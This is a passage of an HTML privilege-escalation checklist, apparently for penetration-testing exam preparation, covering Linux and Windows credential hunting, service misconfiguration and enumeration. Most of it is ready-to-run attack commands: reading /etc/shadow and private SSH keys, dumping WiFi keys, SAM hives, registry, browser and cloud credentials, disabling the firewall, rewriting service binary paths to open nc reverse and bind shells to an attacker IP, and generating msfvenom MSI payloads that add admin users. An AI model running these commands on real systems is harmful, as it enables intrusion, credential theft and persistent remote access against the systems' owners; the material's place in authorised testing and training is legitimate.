                <li><input type="checkbox" data-id="transfer-les"> Transfer Linux Exploit Suggester: try the most
                  probable
                  exploits</li>
              </ul>
              <h5 id="19313-configurations-files">19.3.1.3 Configurations Files</h5>
              <ul>
                <li><input type="checkbox" data-id="check-root-ssh"> <code>/root/.ssh/id_rsa</code></li>
                <li><input type="checkbox" data-id="entire-root-folder"> Entire root folder</li>
                <li><input type="checkbox" data-id="check-env-info"> Check env info</li>
              </ul>
              <pre><code class="language-bash">(env || set) 2>/dev/null
echo $PATH
</code></pre>
              <ul>
                <li><input type="checkbox" data-id="check-suid-set"> Look through <strong>SUID set</strong>
                  <ul>
                    <li><input type="checkbox" data-id="refer-gtfobins"> Refer to gtfobins for this</li>
                    <li><input type="checkbox" data-id="check-suid-write"> Can we write them?</li>
                    <li><input type="checkbox" data-id="google-search"> Google everything</li>
                  </ul>
                </li>
                <li><input type="checkbox" data-id="custom-suid-check"> LOOK EVEN FOR CUSTOM ONES AND USE THEM!
                  <ul>
                    <li><input type="checkbox" data-id="missing-libraries-check"> Are these missing libraries?
                      <ul>
                        <li><input type="checkbox" data-id="ld-library-write"> Do we have write access to the
                          LD_LIBRARY_PATH? IF yes
                          <ul>
                            <li><input type="checkbox" data-id="generate-so-file"> Generate our own .so file and paste
                              it
                              in the writable path</li>
                          </ul>
                        </li>
                      </ul>
                    </li>
                  </ul>
                </li>
              </ul>
              <h5 id="19314-services-and-jobs">19.3.1.4 Services and Jobs</h5>
              <ul>
                <li><input type="checkbox" data-id="enumerate-root-processes"> Enumerate <strong>processes that run as
                    root</strong> and look for weird things: use <code>PSPY</code></li>
                <li><input type="checkbox" data-id="enumerate-internal-services"> Enumerate <strong>internal
                    running</strong> services
                  <ul>
                    <li><input type="checkbox" data-id="curl-website"> If there is a website, play with curl</li>
                    <li><input type="checkbox" data-id="check-user-services"> Are these running as other users that we
                      can
                      become?</li>
                    <li><input type="checkbox" data-id="database-udf-check"> If there is a database running, enumerate
                      for
                      credentials to test for UDF: <code>mysql -uroot -pdasdasd</code></li>
                    <li><input type="checkbox" data-id="remote-port-forward"> <strong>Remote port forward</strong> if we
                      have SSH access, or use chisel or ligolo</li>
                  </ul>
                </li>
                <li><input type="checkbox" data-id="check-init-systemd"> <code>Init</code>, <code>init.d</code>,
                  <code>systemd</code> Services?
                  <ul>
                    <li><input type="checkbox" data-id="overwrite-services"> Can we overwrite them?</li>
                    <li><input type="checkbox" data-id="start-stop-service"> Can we start or stop the service?</li>
                    <li><input type="checkbox" data-id="reboot-machine"> Can we reboot the machine?</li>
                  </ul>
                </li>
                <li><input type="checkbox" data-id="cronjob-check"> Check for <strong>Cronjobs</strong>
                  <ul>
                    <li><input type="checkbox" data-id="overwrite-cronjobs"> Can we overwrite them?</li>
                    <li><input type="checkbox" data-id="edit-cronjobs"> Can we edit them to add malicious code like a
                      reverse shell or elevate the current shell?</li>
                    <li><input type="checkbox" data-id="missing-library-cronjobs"> Are these missing a library when
                      running?</li>
                    <li><input type="checkbox" data-id="overwrite-library-path"> Can we overwrite the library path?</li>
                    <li><input type="checkbox" data-id="google-custom-scripts"> GOOGLE EVERYTHING HERE, some custom
                      scripts have vulnerable expressions</li>
                  </ul>
                </li>
              </ul>
              <h5 id="19315-credentials-search">19.3.1.5 Credentials Search</h5>
              <ul>
                <li><input type="checkbox" data-id="password-files"> <strong>Passwords Files</strong>
                  <ul>
                    <li><input type="checkbox" data-id="etc-passwd"> <code>/etc/passwd</code></li>
                    <li><input type="checkbox" data-id="etc-shadow"> <code>/etc/shadow</code></li>
                    <li><input type="checkbox" data-id="etc-sudoers"> <code>/etc/sudoers</code></li>
                  </ul>
                </li>
                <li><input type="checkbox" data-id="try-known-passwords"> Try <strong>known passwords</strong></li>
                <li><input type="checkbox" data-id="config-files-creds"> <strong>Search creds from config
                    files</strong>:
                  test different words other than PASSWORD, e.g.,
                  <code>pass, passwd, pwd, user, usr, username, secret, cred, credential, auth, secret</code>:
                </li>
              </ul>
              <pre><code class="language-bash">grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
locate password | more
</code></pre>
              <ul>
                <li><input type="checkbox" data-id="strings-creds-services"> Search for creds <strong>in services,
                    either
                    running or not</strong>, that seem weird, using <strong><code>strings</code></strong></li>
                <li><input type="checkbox" data-id="common-files-creds"> Search creds in <strong>common files</strong>:
                </li>
              </ul>
              <pre><code class="language-powershell">history
cat ~/.bash_history
</code></pre>
              <ul>
                <li><input type="checkbox" data-id="local-dbs-creds"> Search <strong>creds from local DBs</strong></li>
                <li><input type="checkbox" data-id="bash-history-creds"> Search creds from <strong>bash
                    history</strong>:
                </li>
              </ul>
              <pre><code class="language-bash">history
cat ~/.bash_history
</code></pre>
              <ul>
                <li><input type="checkbox" data-id="memory-creds"> Search creds <strong>from memory</strong>:</li>
              </ul>
              <pre><code class="language-bash">strings /dev/mem -n10 | grep -i PASS
</code></pre>
              <ul>
                <li><input type="checkbox" data-id="ssh-keys"> <strong>SSH Keys</strong>:</li>
              </ul>
              <pre><code class="language-bash">cat ~/.ssh/id_rsa
ls ~/.ssh/*
find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2> /dev/null
</code></pre>
              <ul>
                <li><input type="checkbox" data-id="rsync-config"> Search <strong>rsync</strong> config file</li>
              </ul>
              <pre><code class="language-bash">find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \)
</code></pre>
              <h4 id="1932-windows">19.3.2 Windows</h4>
              <h5 id="19321-general-user-enumeration">19.3.2.1 General User Enumeration</h5>
              <ul>
                <li><input type="checkbox" data-id="enumerate-user-permissions"> Enumerate current user and its
                  permissions</li>
              </ul>
              <pre><code class="language-powershell">whoami /all
net users %username%
net users
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
</code></pre>
              <ul>
                <li><input type="checkbox" data-id="general-groups-enumeration"> General Groups Enumeration</li>
              </ul>
              <pre><code class="language-powershell">net localgroup
net localgroup Administrators
</code></pre>
              <ul>
                <li><input type="checkbox" data-id="check-user-tokens"> Check if the current user has these tokens</li>
                <ul>
                  <li><input type="checkbox" data-id="token-seimpersonateprivilege"> SeImpersonatePrivilege</li>
                  <li><input type="checkbox" data-id="token-seassignprimaryprivilege"> SeAssignPrimaryPrivilege</li>
                  <li><input type="checkbox" data-id="token-setcbprivilege"> SeTcbPrivilege</li>
                  <li><input type="checkbox" data-id="token-sebackupprivilege"> SeBackupPrivilege</li>
                  <li><input type="checkbox" data-id="token-serestoreprivilege"> SeRestorePrivilege</li>
                  <li><input type="checkbox" data-id="token-secreatetokenprivilege"> SeCreateTokenPrivilege</li>
                  <li><input type="checkbox" data-id="token-seloaddriverprivilege"> SeLoadDriverPrivilege</li>
                  <li><input type="checkbox" data-id="token-setakeownershipprivilege"> SeTakeOwnershipPrivilege</li>
                  <li><input type="checkbox" data-id="token-sedebugprivilege"> SeDebugPrivilege</li>
                </ul>
                <li><input type="checkbox" data-id="check-privileges"> Check the privileges</li>
                <ul>
                  <li><input type="checkbox" data-id="privilege-seimpersonate"> SeImpersonate</li>
                  <li><input type="checkbox" data-id="privilege-seloaddriver"> SeLoadDriver</li>
                  <li><input type="checkbox" data-id="privilege-serestore"> SeRestore</li>
                  <li><input type="checkbox" data-id="privilege-seimpersonateprivilege"> SeImpersonatePrivilege</li>
                  <li><input type="checkbox" data-id="privilege-seassignprimaryprivilege"> SeAssignPrimaryPrivilege</li>
                  <li><input type="checkbox" data-id="privilege-setcbprivilege"> SeTcbPrivilege</li>
                  <li><input type="checkbox" data-id="privilege-sebackupprivilege"> SeBackupPrivilege</li>
                  <li><input type="checkbox" data-id="privilege-serestoreprivilege"> SeRestorePrivilege</li>
                  <li><input type="checkbox" data-id="privilege-secreatetokenprivilege"> SeCreateTokenPrivilege</li>
                  <li><input type="checkbox" data-id="privilege-seloaddriverprivilege"> SeLoadDriverPrivilege</li>
                  <li><input type="checkbox" data-id="privilege-setakeownershipprivilege"> SeTakeOwnershipPrivilege</li>
                  <li><input type="checkbox" data-id="privilege-sedebugprivilege"> SeDebugPrivilege</li>
                </ul>
                <li><input type="checkbox" data-id="use-enum-scripts"> Use Enumeration Scripts</li>
                <ul>
                  <li><input type="checkbox" data-id="script-winpeas"> WinPeas</li>
                  <li><input type="checkbox" data-id="script-powerup"> PowerUp</li>
                  <li><input type="checkbox" data-id="script-seatbelt"> Seatbelt</li>
                  <li><input type="checkbox" data-id="script-sherlock"> Sherlock</li>
                  <li><input type="checkbox" data-id="script-rubeus"> Rubeus</li>
                  <li><input type="checkbox" data-id="script-sharphound"> SharpHound</li>
                </ul>
              </ul>
              <h5 id="19322-system-enumeration">19.3.2.2 System Enumeration</h5>
              <ul>
                <li><input type="checkbox" data-id="check-windows-version"> Windows version</li>
              </ul>
              <pre><code class="language-powershell">systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
</code></pre>
              <ul>
                <li><input type="checkbox" data-id="check-software-versions"> Software Versions</li>
                <li><input type="checkbox" data-id="check-service-versions"> Service Versions</li>
              </ul>
              <ul>
                <li><input type="checkbox" data-id="check-installed-patches"> Installed patches and updates</li>
              </ul>
              <pre><code class="language-powershell">wmic qfe
</code></pre>
              <ul>
                <li><input type="checkbox" data-id="check-architecture"> Architecture</li>
              </ul>
              <pre><code class="language-powershell">wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
</code></pre>
              <ul>
                <li><input type="checkbox" data-id="check-environment-variables"> Environment variables</li>
              </ul>
              <pre><code class="language-powershell">wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
</code></pre>
              <ul>
                <li><input type="checkbox" data-id="check-drives"> Drives</li>
              </ul>
              <pre><code class="language-powershell">wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
</code></pre>
              <ul>
                <li><input type="checkbox" data-id="check-kernel-version"> Kernel version</li>
              </ul>
              <pre><code class="language-bash"># List of exploits kernel https://github.com/SecWiki/windows-kernel-exploits
# to cross compile a program from Kali
$ i586-mingw32msvc-gcc -o adduser.exe useradd.c
</code></pre>
              <h5 id="19323-network-enumeration">19.3.2.3 Network Enumeration</h5>
              <p>ARE THE RUNNING SERVICES RUNNING AS OTHER USERS? CAN WE MODIFY THE WEBSTE MAYBE BY PASTING A PHP FILE
                THAT RUNS AS THE USER WHO HOSTS THE WEBSITE</p>
              <ul>
                <li><input type="checkbox" data-id="services-running-on-localhost"> Services <strong>running on
                    localhost</strong></li>
                <li><input type="checkbox" data-id="list-all-nics-ip-dns"> List all NICs, IP and DNS</li>
              </ul>
              <pre><code class="language-powershell">ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
</code></pre>
              <ul>
                <li><input type="checkbox" data-id="list-routing-table"> List routing table</li>
              </ul>
              <pre><code class="language-powershell">route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
</code></pre>
              <ul>
                <li><input type="checkbox" data-id="list-arp-table"> List ARP table</li>
              </ul>
              <pre><code class="language-powershell">arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
</code></pre>
              <ul>
                <li><input type="checkbox" data-id="list-current-connections"> List current connections</li>
              </ul>
              <pre><code class="language-powershell">netstat -ano
</code></pre>
              <ul>
                <li><input type="checkbox" data-id="list-current-connections-with-services"> List current connections
                  correlated to running service (requires elevated privs)</li>
              </ul>
              <pre><code class="language-powershell">netstat -bona
</code></pre>
              <ul>
                <li><input type="checkbox" data-id="list-firewall-state-config"> List firewall state and config</li>
              </ul>
              <pre><code class="language-powershell">netsh advfirewall firewall dump
netsh firewall show state
netsh firewall show config
</code></pre>
              <ul>
                <li><input type="checkbox" data-id="list-firewall-blocked-ports"> List firewall's blocked ports</li>
              </ul>
              <pre><code class="language-powershell">$f=New-object -comObject HNetCfg.FwPolicy2;$f.rules |  where {$_.action -eq "0"} | select name,applicationname,localports
</code></pre>
              <ul>
                <li><input type="checkbox" data-id="disable-firewall"> Disable firewall</li>
              </ul>
              <pre><code class="language-powershell">netsh advfirewall set allprofiles state off
netsh firewall set opmode disable
</code></pre>
              <ul>
                <li><input type="checkbox" data-id="list-network-shares"> List network shares</li>
              </ul>
              <pre><code class="language-powershell">net share
powershell Find-DomainShare -ComputerDomain domain.local
</code></pre>
              <ul>
                <li><input type="checkbox" data-id="snmp-config"> SNMP config</li>
              </ul>
              <pre><code class="language-powershell">reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
</code></pre>
              <h5 id="19324-misconfigurations">19.3.2.4 Misconfigurations</h5>
              <ul>
                <li><input type="checkbox" data-id="services"> Services</li>
                <li><input type="checkbox" data-id="restart-machine"> Can we restart the machine?</li>
                <li><input type="checkbox" data-id="start-stop-service"> Can we start and stop the service?
                  <ul>
                    <li><input type="checkbox" data-id="check-permissions"> Check permissions</li>
                  </ul>
                  <pre><code class="language-powershell"># using sc
sc qc &lt;service_name&gt;

# using accesschk.exe
accesschk.exe -ucqv &lt;Service_Name&gt;
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2&gt;nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version

# using msf
exploit/windows/local/service_permissions
</code></pre>
                  <ul>
                    <li><input type="checkbox" data-id="unquoted-service-path"> Unquoted Service Path</li>
                  </ul>
                  <pre><code class="language-powershell">wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\" |findstr /i /v ""
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32\" |findstr /i /v "" #Not only auto services
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '*'} | select PathName,DisplayName,Name
</code></pre>
                  <ul>
                    <li><input type="checkbox" data-id="change-service-binary"> Change service binary path</li>
                  </ul>
                  <pre><code class="language-powershell"># if the group "Authenticated users" has SERVICE_ALL_ACCESS
# it can modify the binary path
# bind shell
sc config &lt;Service_Name&gt; binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"

# reverse shell
sc config &lt;Service_Name&gt; binpath= "cmd \c C:\Users\nc.exe &lt;attacker-ip&gt; 4444 -e cmd.exe"

# add user to local admin group
sc config &lt;Service_Name&gt; binpath= "net localgroup administrators username /add"

# example using SSDPRV
sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"

# then restart the service
wmic service NAMEOFSERVICE call startservice
net stop [service name] &amp;&amp; net start [service name]
</code></pre>
                  <ul>
                    <li><input type="checkbox" data-id="dll-hijacking"> DLL Hijacking / Overwrite service binary</li>
                  </ul>
                  <pre><code class="language-powershell">for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a &gt;&gt; %temp%\perm.txt
for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2&gt;nul | findstr "(M) (F) :\"

# do it by using sc
sc query state= all | findstr "SERVICE_NAME:" &gt;&gt; C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i &gt;&gt; C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" &gt;&gt; C:\Temp\path.txt
</code></pre>
                  <ul>
                    <li><input type="checkbox" data-id="registry-modify-permissions"> Registry modify permissions</li>
                  </ul>
                  <pre><code class="language-powershell">reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services
#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2&gt;nul &amp; reg save %a %temp%\reg.hiv 2&gt;nul &amp;&amp; reg restore %a %temp%\reg.hiv 2&gt;nul &amp;&amp; echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "&lt;Username&gt; Users Path Everyone"

# if Authenticated Users or NT AUTHORITY\INTERACTIVE have FullControl
# it can be leveraged to change the binary path inside the registry
reg add HKLM\SYSTEM\CurrentControlSet\srevices\&lt;service_name&gt; /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
</code></pre>
                </li>
              </ul>
              <ul>
                <li><input type="checkbox" data-id="installed-applications"><strong> Installed Applications</strong>
                  <ul>
                    <li><input type="checkbox" data-id="dll-hijacking-installed-apps"> DLL Hijacking for installed
                      applications</li>
                  </ul>
                  <pre><code class="language-powershell">dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
</code></pre>
                </li>
              </ul>
              <ul>
                <li><input type="checkbox" data-id="write-permissions"> Write permissions</li>
              </ul>
              <pre><code class="language-powershell"># using accesschk.exe
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\

# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*

# using icacls
icacls "C:\Program Files\*" 2&gt;nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2&gt;nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"

# using Powershell
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}} 

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
</code></pre>
              <pre><code class="language-powershell"># PATH DLL Hijacking
# having write permissions inside a folder present ON PATH could bring to DLL hijacking
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2&gt;nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\ everyone authenticated users todos %username%" &amp;&amp; echo. )
</code></pre>
              <ul>
                <li><input type="checkbox" data-id="alwaysinstall-elevated"> <strong>AlwaysInstallElevated set in
                    Registry</strong></li>
              </ul>
              <pre><code class="language-powershell"># if both are enabled (set to 0x1), it&#39;s possible to execute
# any .msi as NT AUTHORITY\SYSTEM
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# check with msf
exploit/windows/local/always_install_elevated

# generate payload with msfvenom
# no uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi
# using the msiexec the uac wont be prompted
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi

# install .msi
msiexec /quiet /qn /i C:\Users\Homer.NUCLEAR\Downloads\donuts.msi
</code></pre>

              <ul>
                <li><input type="checkbox" data-id="scheduled-tasks"> <strong>Scheduled Tasks</strong>
                  <ul>
                    <li><input type="checkbox" data-id="executable-file-writeable"> Executable file writeable</li>
                    <li><input type="checkbox" data-id="dependency-writeable"> Dependency writeable</li>
                  </ul>
                </li>
              </ul>
              <pre><code class="language-powershell"># using schtasks
schtasks /query /fo LIST /v
# filtering the output
schtasks /query /fo LIST /v | findstr /v "\Microsoft"

# using powershell
Get-ScheduledTask | ft TaskName,TaskPath,State
# filtering the output
Get-ScheduledTask | where {$_.TaskPath -nolike "\Microsoft*"} | ft TaskName,TaskPath,State
</code></pre>

              <ul>
                <li><input type="checkbox" data-id="sensitive-files-readable"> Sensitive Files Readable:
                  <ul>
                    <li><input type="checkbox" data-id="sam-hive"> SAM Hive</li>
                    <li><input type="checkbox" data-id="system-hive"> SYSTEM Hive</li>
                  </ul>
                </li>
                <li><input type="checkbox" data-id="windows-subsystem-linux"> <strong>Windows Subsystem For
                    Linux</strong>: navigate to the filesystem and look for suspicious scripts; replace them if
                  possible.
                </li>
              </ul>
              <pre><code class="language-powershell">wsl whoami
./ubuntum2004.exe config --default-user root
wsl whoami
wsl python -c 'put here your command'
</code></pre>

              <h5 id="19325-credential-access">19.3.2.5 Credential Access</h5>
              <ul>
                <li><input type="checkbox" data-id="medium-to-high-level"> Go from <strong>Medium mandatory
                    level</strong>
                  to <strong>High mandatory level</strong></li>
              </ul>
              <pre><code class="language-powershell"># Using powershell
powershell.exe Start-Process cmd.exe -Verb runAs
</code></pre>

              <ul>
                <li><input type="checkbox" data-id="try-known-passwords"> <strong>TRY KNOWN PASSWORDS!</strong></li>
              </ul>
              <pre><code class="language-powershell"># Check also with runas
C:\Windows\System32\runas.exe /env /noprofile /user:&lt;username&gt; &lt;password&gt; "c:\users\Public\nc.exe -nc &lt;attacker-ip&gt; 4444 -e cmd.exe"
</code></pre>

              <ul>
                <li><input type="checkbox" data-id="find-creds-from-config-files"> Find creds from <strong>config
                    files</strong> (try different words e.g: pass, passwd, pwd, user, usr, username, secret, cred,
                  credential, auth):
                </li>
              </ul>
              <pre><code class="language-powershell">dir /s /b /p *pass* == *cred* == *vnc* == *.config* == *conf* == *ini*
findstr /si /m password *.xml *.ini *.txt
</code></pre>

              <ul>
                <li><input type="checkbox" data-id="creds-from-local-dbs"> Creds from <strong>local DBs</strong></li>
                <li><input type="checkbox" data-id="creds-from-windows-vault"> Creds from <strong>Windows Vault</strong>
                </li>
              </ul>
              <pre><code class="language-powershell">cmdkey /list
# if found
runas /savecred /user:WORKGROUP\Administrator "\\attacker-ip\SHARE\welcome.exe"
</code></pre>

              <ul>
                <li><input type="checkbox" data-id="creds-from-registry"> Creds from <strong>Registry</strong></li>
              </ul>
              <pre><code class="language-powershell">reg query HKLM /f pass /t REG_SZ /s
reg query HKCU /f pass /t REG_SZ /s

reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Windows Autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2&gt;nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"

# SNMP parameters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty credentials
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\

# VNC credentials
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4" /v password

## OpenSSH credentials
reg query HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys
</code></pre>

              <ul>
                <li><input type="checkbox" data-id="creds-from-unattend-files"> Creds from <strong>Unattend or Sysprep
                    Files</strong></li>
              </ul>
              <pre><code class="language-powershell">c:\sysprep.inf
c:\sysprep\sysprep.xml
%WINDIR%\Panther\Unattend\Unattend*.xml
%WINDIR%\Panther\Unattend*.xml
</code></pre>

              <ul>
                <li><input type="checkbox" data-id="creds-from-log-files"> Creds from <strong>Log Files</strong></li>
              </ul>
              <pre><code class="language-powershell">dir /s /b /p *access*.log* == *.log
</code></pre>

              <ul>
                <li><input type="checkbox" data-id="creds-from-iis-web-config"> Creds from <strong>IIS web
                    config</strong>
                </li>
              </ul>
              <pre><code class="language-powershell">Get-Childitem -Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem -Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
</code></pre>
              <ul>
                <li><input type="checkbox" data-id="check-interesting-files"> Check other possible interesting files
                </li>
              </ul>
              <pre><code class="language-powershell">dir c:*vnc.ini /s /b
dir c:*ultravnc.ini /s /b
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*vnc.ini, ultravnc.ini, \*vnc\*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
setupinfo
setupinfo.bak
key3.db #Firefox
key4.db #Firefox
places.sqlite #Firefox
"Login Data" #Chrome
Cookies #Chrome
Bookmarks #Chrome
History #Chrome
TypedURLsTime #IE
TypedURLs #IE
</code></pre>
              <ul>
                <li><input type="checkbox" data-id="wifi-creds"> Creds from WiFi</li>
              </ul>
              <pre><code class="language-powershell"># 1. Find AP SSID
netsh wlan show profile
# 2. Get cleartext password
netsh wlan show profile &lt;SSID&gt; key=clear
# OR
# Go hard and grab 'em all
cls &amp; echo. &amp; for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off &gt; nul &amp; (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" &amp; echo.) &amp; @echo on
</code></pre>
              <ul>
                <li><input type="checkbox" data-id="sticky-notes-creds"> Creds from sticky notes app</li>
              </ul>
              <pre><code class="language-powershell">c:\Users\&lt;user&gt;\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
</code></pre>
              <ul>
                <li><input type="checkbox" data-id="service-creds"> Creds stored in services</li>
              </ul>
              <pre><code class="language-powershell"># SessionGopher to grab PuTTY, WinSCP, FileZilla, SuperPuTTY, RDP
# https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm\-arvanaghi -p s3cr3tP@ss
</code></pre>
              <ul>
                <li><input type="checkbox" data-id="powershell-history-creds"> Creds from Powershell History</li>
              </ul>
              <pre><code class="language-powershell">type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
</code></pre>
              <ul>
                <li><input type="checkbox" data-id="alternate-data-stream"> Creds from alternate data stream</li>
              </ul>
              <pre><code class="language-powershell">Get-Item -path &lt;filename&gt; -Stream *
Get-Content -path &lt;filename&gt; -Stream &lt;keyword&gt;
</code></pre>
              <ul>
                <li><input type="checkbox" data-id="sam-system-bak"> SAM &amp; SYSTEM bak</li>
              </ul>
              <pre><code class="language-powershell"># Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
</code></pre>
              <ul>
                <li><input type="checkbox" data-id="cloud-creds"> Cloud credentials</li>
              </ul>
              <pre><code class="language-powershell"># From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
</code></pre>
              <ul>
                <li><input type="checkbox" data-id="gpp-password"> Cached GPP password</li>
              </ul>
              <pre><code class="language-powershell"># Before Vista look inside
C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history
# After Vista look inside
C:\ProgramData\Microsoft\Group Policy\history
# Look for
Groups.xml
Services.xml
Scheduledtasks.xml
DataSources.xml
Printers.xml
Drives.xml

# Decrypt the passwords with
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
</code></pre>
              <ul>
